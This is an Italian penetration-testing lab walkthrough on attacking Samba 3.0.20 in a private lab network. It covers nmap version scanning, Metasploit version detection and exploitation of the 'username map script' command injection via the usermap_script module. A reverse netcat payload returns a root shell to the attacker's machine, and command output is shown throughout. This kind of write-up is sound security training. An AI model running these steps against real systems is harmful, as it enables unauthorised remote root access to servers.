# Samba

Samba è un insieme di strumenti utilizzati sulle piattaforme Unix e GNU/Linux che utilizza il protcollo SMB (Server Message Block). 

Tale protocollo è definito per le reti Microsoft Windows ed è stato progettato originariamente per reti piccole. Ad oggi è installato di default e permette di rendere visibile all’interno di una rete windows una macchina Linux. 

Altri servizi offerti da samba sono:
- Server per la condivisione di file system e stampanti;
- Client per lìaccesso a risrse NetBIOS su macchine Unix;
- Server DFS (Distributed File System).

Dalla procedura di enumeration iniziale sappiamo che la macchina target presenta samba sul porto 139 e 445. Per effettuare un attacco mirato a tale servizio è buona norma otterne informazioni sulla specifica versione per ricercarne delle vulnerabilità note. 

Da shell quindi digitaimo il comando ` namp -sV -p 137-139,455 192.168.xxx.xxx` che permette di ottenere la lista di servizi attivi sulla porta con il loro stato e il numero di versione. In particolare, nel nostro caso otteniamo il seguente output:

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-12 19:46 CET
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.198.4
Host is up (0.0049s latency).

PORT    STATE  SERVICE     VERSION
137/tcp closed netbios-ns
138/tcp closed netbios-dgm
139/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.40 seconds

```

Per ottenere informazioni più dettagliate sulla versione di samba utilizzeremo un modulo auxiliary interno a metasploit. Accediamo dunque alla msfconsole e digitiamo ` auxiliary/scanner/smb/smb_version` e successivamente eseguiamo uno show options. Successivamente settando la macchina target nel campo rhost ed eseguendo un run otteniamo l'esatto numero di versione del servizio presente sul nostro target

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.198.4
rhosts => 192.168.198.4
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.198.4:445     - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 192.168.198.4:445     -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 192.168.198.4:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
Ricerchiamo per  tale versione delle vulnerabilità note e scopriamo che essa soffre di una vulnerabilità dovuta ad una cattiva gestione del mapping degli username. In particolare, vi è una linea del file di configurazione che punta ad un file ssh che effettua il mapping degli user che fa però affidamento a comandi esterni per fare mapping di user e di input per cui ogni input non è filtrato o “sanificato”.

Una prima soluzione che permette di ovviare a tale vulnerabilità è modificare questa linea all'interno del file di configurazone. 

Mostriamo di seguito come sfruttare tale vulenrabilità grazie a Metasploit. 

Effettuiamo un search name per samba e otteniamo una serie di payloads di attacchi disponibili. Per la nostra particolare vulerabilità useremo il payload `username_script`.

```
msf6 auxiliary(scanner/smb/smb_version) > search name:samba

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   exploit/multi/samba/usermap_script           2007-05-14       excellent  No     Samba "username map script" Command Execution
   1   exploit/multi/samba/nttrans                  2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   2   exploit/linux/samba/setinfopolicy_heap       2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   3   auxiliary/admin/smb/samba_symlink_traversal                   normal     No     Samba Symlink Directory Traversal
   4   auxiliary/scanner/smb/smb_uninit_cred                         normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   5   exploit/linux/samba/chain_reply              2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   6   exploit/linux/samba/is_known_pipename        2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   7   auxiliary/dos/samba/lsa_addprivs_heap                         normal     No     Samba lsa_io_privilege_set Heap Overflow
   8   auxiliary/dos/samba/lsa_transnames_heap                       normal     No     Samba lsa_io_trans_names Heap Overflow
   9   exploit/linux/samba/lsa_transnames_heap      2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   10  exploit/osx/samba/lsa_transnames_heap        2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   11  exploit/solaris/samba/lsa_transnames_heap    2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   12  auxiliary/dos/samba/read_nttrans_ea_list                      normal     No     Samba read_nttrans_ea_list Integer Overflow
   13  exploit/freebsd/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   14  exploit/linux/samba/trans2open               2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   15  exploit/osx/samba/trans2open                 2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   16  exploit/solaris/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   17  exploit/windows/http/sambar6_search_results  2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow


Interact with a module by name or index. For example info 17, use 17 or use exploit/windows/http/sambar6_search_results

```
Lanciamo quindi `use exploit/multi/samba/usermap_script` e vediamo le opzioni di tale pacchetto con show options ottenendo:

```
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Andremo a settare per tale pacchetto rhosts e anche lhost e lport come segue:

```
msf6 exploit(multi/samba/usermap_script) > set rhosts 192.168.198.4
rhosts => 192.168.198.4

msf6 exploit(multi/samba/usermap_script) > set lhost 192.168.198.3
lhost => 192.168.198.3
msf6 exploit(multi/samba/usermap_script) > set LPORT 8667
LPORT => 8667
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.198.4    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.198.3    yes       The listen address (an interface may be specified)
   LPORT  8667             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```
Lanciando ora il comando `exploit` entreremo all'interno della macchina target con una shell root.

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 192.168.198.3:8667 
[*] Command shell session 1 opened (192.168.198.3:8667 -> 192.168.198.4:53732) at 2021-12-12 20:01:02 +0100

whoami
root
ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:7d:c6  
          inet addr:192.168.198.4  Bcast:192.168.198.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe6d:7dc6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:16 errors:0 dropped:0 overruns:0 frame:0
          TX packets:44 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:3134 (3.0 KB)  TX bytes:5436 (5.3 KB)
          Base address:0xd020 Memory:f0200000-f0220000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:111 errors:0 dropped:0 overruns:0 frame:0
          TX packets:111 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:27845 (27.1 KB)  TX bytes:27845 (27.1 KB)

```
